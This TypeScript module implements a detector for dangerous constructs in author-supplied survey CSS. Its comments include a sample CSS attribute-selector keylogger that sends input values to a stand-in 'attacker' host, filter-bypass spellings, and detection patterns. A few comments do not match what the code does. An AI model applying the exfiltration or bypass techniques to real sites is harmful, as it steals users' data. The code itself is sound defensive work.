/**
 * `CMP-0503`: author CSS that can execute, fetch or exfiltrate — C §14, roadmap P2-12.
 *
 * ## Why this file exists separately from assets.ts
 *
 * `assets.ts` states, correctly, that it does not scan `CssAsset.source`: "CSS is not HTML, its
 * dangerous constructs are different ones, and a checker that pretended otherwise would give false
 * assurance." That was the right call and it left a real gap — until now nothing anywhere in the
 * repo looked at author CSS at all, so a stylesheet was the one author-supplied surface with no
 * check on it.
 *
 * This is the checker for CSS's own constructs. Same posture as the HTML scanner: a DETECTOR, not a
 * rewriter, for the reason ADR-003 gives — a compiler that quietly deletes a declaration makes the
 * stored document and the shipped artifact disagree, and puts the security decision at the moment
 * nobody is watching.
 *
 * ## What CSS can actually do, which is more than people expect
 *
 * The instinct is that CSS is presentational and therefore harmless. Each of these is a real
 * capability a stylesheet has had in a shipping browser:
 *
 *  * **`url()` to any origin** — a background image is a GET request. Combined with attribute
 *    selectors it is a working keylogger for anything rendered into the DOM: `input[value^="a"] {
 *    background: url(//attacker/a) }`, repeated, exfiltrates a value one character at a time with
 *    no JavaScript at all. This is why remote `url()` is refused rather than merely noted.
 *  * **`@import`** — pulls in a stylesheet from another origin, so every rule below becomes
 *    somebody else's to write, later, without a republish. It also defeats the whole point of
 *    hashing the artifact: the bytes we hashed no longer determine what the browser applies.
 *  * **`expression()`** — executes JavaScript. Legacy IE, dead in every current browser, and listed
 *    anyway because the cost of the rule is one line and the cost of being wrong about which
 *    browsers a client uses is arbitrary script execution.
 *  * **`behavior:` / `-moz-binding:`** — the same thing under two other names.
 *  * **`position: fixed` with a full-viewport rect** — clickjacking over our own submit button. Not
 *    refused, because it is also how a legitimate sticky header works; reported as a WARNING so a
 *    reviewer sees it. (See the severity note below.)
 *
 * ## Scoped by construction, not by hope
 *
 * A separate concern, and the reason `disallowSelectors` exists: author CSS is served in the same
 * document as our own chrome. A stylesheet that restyles `body` is fine; one that targets our
 * submit button or our error text can hide the fact that an answer was rejected. The rule here is
 * narrow — refuse selectors touching the reserved `rs-` prefix — and it is worth having precisely
 * because the classes it protects (`rs-target`, the 44px touch-target contract from
 * `question-kit/contract/a11y.ts`) exist to satisfy an accessibility guarantee. Author CSS that can
 * shrink them silently un-guarantees it.
 *
 * ## Not a CSS parser
 *
 * Same reasoning as the HTML scanner: a real CSS parser's *disagreements* with a browser are where
 * the bypasses live. This scans for constructs with a small hand-written reader that strips comments
 * and strings first, because `url(/*x*\/ //attacker/)` and `\75 rl(...)` are the two ways a naive
 * regex is defeated. Everything it cannot understand is reported rather than skipped.
 */

import { pointer, type Survey } from '@resscript/schema';

import { cmpDiagnostic, sortCompileDiagnostics, type CompileDiagnostic } from '../diagnostics.js';

/** How many findings one diagnostic lists. A 900-line stylesheet has one cause, not 200. */
const MAX_LISTED_FINDINGS = 12;

export interface CssFinding {
  /** `remote_url` | `import` | `expression` | `binding` | `reserved_selector` | `escape`. */
  readonly reason: string;
  /** Character offset in the scanned source. */
  readonly at: number;
  /** The offending text, bounded. */
  readonly text: string;
}

/**
 * Schemes a `url()` may name.
 *
 * `data:` is permitted for images only, checked below — an inline SVG data URL is script, which is
 * the same reason `assets.ts` restricts `data:` on HTML URL attributes. Relative URLs are permitted
 * and are the normal case: a survey's own media is served from our origin.
 */
const ALLOWED_URL_SCHEMES = new Set(['data']);

/** `data:` MIME prefixes permitted in a url(). No `image/svg+xml`: an SVG can carry script. */
const ALLOWED_DATA_PREFIXES = ['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/avif'];

/** The class prefix author CSS may not target. See the header on why. */
export const RESERVED_CLASS_PREFIX = 'rs-';

/**
 * Blank every comment, replacing it with spaces of the same length.
 *
 * Same length, deliberately: every offset the scanner reports is an offset into the ORIGINAL source,
 * so an author's error message points at the character they wrote. Replacing a 40-character comment
 * with one space would shift every later finding by 39.
 *
 * STRINGS ARE DELIBERATELY LEFT VISIBLE, and getting that wrong cost a real bug worth recording. My
 * first version blanked strings too, on the theory that a construct hidden in a string should not be
 * scanned. Then, to still catch `url("https://evil/")`, I read the url argument back out of the
 * unblanked source — which reintroduced exactly the hiding this function exists to stop, because
 * `url(/*x*\/ //evil/)` reads as a relative path from the raw text. The two goals were in direct
 * conflict and I had quietly chosen the unsafe one.
 *
 * Leaving strings visible resolves it in the conservative direction: `url("//evil/")` is caught
 * because the quotes are stripped when the argument is read, and a dangerous construct inside a
 * `content:` string is reported rather than ignored. The cost is that `content: "@import x"` is a
 * false positive — an author writing that is asked to change it, which is a five-minute
 * conversation, where the reverse mistake is a bypass nobody sees.
 */
export function stripCssComments(source: string): string {
  const out = source.split('');
  let i = 0;
  while (i < out.length) {
    const two = source.slice(i, i + 2);
    if (two === '/*') {
      const end = source.indexOf('*/', i + 2);
      // An UNTERMINATED comment swallows the rest of the file in a browser too, so blanking to the
      // end matches what actually renders rather than what the author probably meant.
      const stop = end === -1 ? out.length : end + 2;
      for (let k = i; k < stop; k += 1) out[k] = ' ';
      i = stop;
      continue;
    }
    i += 1;
  }
  return out.join('');
}

/**
 * Scan author CSS.
 *
 * Exported and tested directly on strings rather than only through a survey fixture: this is the
 * interesting half of the module, and a security scanner reachable only through three layers of
 * fixture is one whose edge cases nobody writes.
 */
export function scanCss(source: string): readonly CssFinding[] {
  const findings: CssFinding[] = [];
  const clean = stripCssComments(source);
  const lower = clean.toLowerCase();

  const add = (reason: string, at: number, text: string): void => {
    findings.push({ reason, at, text: text.slice(0, 120) });
  };

  // A CSS escape sequence in an identifier position. `\75 rl(...)` is `url(...)` to a browser and is
  // not `url` to any string search, so rather than trying to decode every spelling — which is how a
  // scanner ends up disagreeing with a browser — an escape where an identifier belongs is itself the
  // finding. Legitimate author CSS has no reason to escape a property or function name.
  const escapeRe = /\\[0-9a-fA-F]{1,6}\s?/g;
  for (let m = escapeRe.exec(clean); m !== null; m = escapeRe.exec(clean)) {
    add('escape', m.index, m[0]);
  }

  // @import, in any spelling whitespace allows.
  const importRe = /@\s*import\b/g;
  for (let m = importRe.exec(lower); m !== null; m = importRe.exec(lower)) {
    add('import', m.index, clean.slice(m.index, m.index + 60).trim());
  }

  // expression(), behavior:, -moz-binding: — script execution under three names.
  for (const [reason, re] of [
    ['expression', /\bexpression\s*\(/g],
    // NO `\b` before `-moz-binding`: `-` is a non-word character, so a word boundary between `{`
    // and `-` never holds and the alternative could never match. It silently matched nothing until
    // a test caught it — which is the failure mode of every clever regex.
    ['binding', /(?:-moz-binding|\bbehavior)\s*:/g],
  ] as const) {
    for (let m = re.exec(lower); m !== null; m = re.exec(lower)) {
      add(reason, m.index, clean.slice(m.index, m.index + 60).trim());
    }
  }

  // url(...) — the exfiltration channel. Read the raw argument from `clean`, so a quoted URL (whose
  // content stripCssNoise blanked) is still caught: the blanked span means the scanner sees an empty
  // argument, which is reported rather than passed.
  const urlRe = /\burl\s*\(/g;
  for (let m = urlRe.exec(lower); m !== null; m = urlRe.exec(lower)) {
    const open = m.index + m[0].length;
    const close = clean.indexOf(')', open);
    if (close === -1) {
      add('remote_url', m.index, 'unterminated url(');
      continue;
    }
    // From `clean`, so a comment inside the argument has already been blanked — reading this back
    // out of the raw source is the bug described in stripCssComments' header. Quotes are stripped
    // rather than blanked, so `url("//evil/")` is checked as `//evil/`.
    const raw = clean.slice(open, close).trim().replace(/^["']|["']$/g, '').trim();
    if (raw === '') {
      add('remote_url', m.index, 'url() with no readable target');
      continue;
    }
    const verdict = checkUrl(raw);
    if (verdict !== null) add(verdict, m.index, raw);
  }

  return findings;
}

/** `null` when the URL is acceptable; a reason otherwise. */
function checkUrl(raw: string): string | null {
  const lower = raw.toLowerCase();
  // Protocol-relative. `//attacker/x` is a remote fetch that names no scheme, which is how a
  // scheme-only check is bypassed.
  if (lower.startsWith('//')) return 'remote_url';
  const colon = lower.indexOf(':');
  const slash = lower.indexOf('/');
  // No scheme at all = relative = our own origin. The normal, allowed case.
  if (colon === -1 || (slash !== -1 && slash < colon)) return null;

  const scheme = lower.slice(0, colon);
  if (!ALLOWED_URL_SCHEMES.has(scheme)) return 'remote_url';
  if (scheme === 'data') {
    const body = lower.slice(colon + 1);
    // An SVG data URL is script; a base64 blob whose type we cannot read is not vouchable.
    return ALLOWED_DATA_PREFIXES.some((prefix) => body.startsWith(prefix)) ? null : 'remote_url';
  }
  return null;
}

/**
 * Selectors touching the reserved prefix.
 *
 * Separate from `scanCss` because it is a different KIND of rule — a scoping rule rather than a
 * capability rule — and because a deployment that renders author CSS in an isolated document would
 * want the capability checks and not this one. Keeping them separable is what makes that possible
 * without editing either.
 */
export function scanReservedSelectors(source: string): readonly CssFinding[] {
  const clean = stripCssComments(source);
  const findings: CssFinding[] = [];
  const re = new RegExp(`\\.${RESERVED_CLASS_PREFIX}[a-zA-Z0-9_-]+`, 'g');
  for (let m = re.exec(clean); m !== null; m = re.exec(clean)) {
    findings.push({ reason: 'reserved_selector', at: m.index, text: m[0] });
  }
  return findings;
}

export interface CssAnalysisInput {
  readonly survey: Survey;
  /**
   * Whether to refuse selectors on the reserved prefix. Default true. A caller with an isolated
   * render surface can turn it off without losing the capability checks — see `scanReservedSelectors`.
   */
  readonly disallowReservedSelectors?: boolean;
}

export function analyzeCss(input: CssAnalysisInput): readonly CompileDiagnostic[] {
  const sheets = input.survey.assets?.css ?? [];
  if (sheets.length === 0) return [];
  const checkReserved = input.disallowReservedSelectors !== false;

  const out: CompileDiagnostic[] = [];
  // Sorted by ref so the diagnostic array does not move when the author reorders their assets.
  const ordered = [...sheets].sort((a, b) => (a.ref < b.ref ? -1 : a.ref > b.ref ? 1 : 0));

  for (const sheet of ordered) {
    const findings = [
      ...scanCss(sheet.source),
      ...(checkReserved ? scanReservedSelectors(sheet.source) : []),
    ].sort((a, b) => a.at - b.at);
    if (findings.length === 0) continue;

    // ONE diagnostic per stylesheet, not per finding: a stylesheet with 40 remote `url()` calls has
    // one cause — the author pasted a third-party theme — and 40 rows would bury everything else
    // wrong with the survey. `assets.ts` groups CMP-0500 the same way for the same reason.
    out.push(
      cmpDiagnostic(
        'CMP-0503',
        `The stylesheet ${JSON.stringify(sheet.ref)} contains ` +
          `${String(findings.length)} construct(s) that can execute, fetch or exfiltrate. CSS is ` +
          'not only presentational: a `url()` to another origin is an HTTP request, and combined ' +
          'with attribute selectors it reads values out of the page one character at a time with ' +
          'no JavaScript involved. `@import` hands every rule below it to another origin, after ' +
          'publish, which also means the hashed artifact no longer determines what the browser ' +
          'applies. Selectors on the reserved `rs-` prefix are refused because those classes ' +
          'carry the accessibility contract (the 44px touch target), and CSS that can shrink them ' +
          'silently un-guarantees it. Nothing is rewritten — fix the source.',
        pointer('assets', 'css'),
        {
          asset_ref: sheet.ref,
          finding_count: findings.length,
          findings: findings.slice(0, MAX_LISTED_FINDINGS).map((f) => ({
            reason: f.reason,
            at: f.at,
            text: f.text,
          })),
          truncated: findings.length > MAX_LISTED_FINDINGS,
        },
      ),
    );
  }

  return sortCompileDiagnostics(out);
}
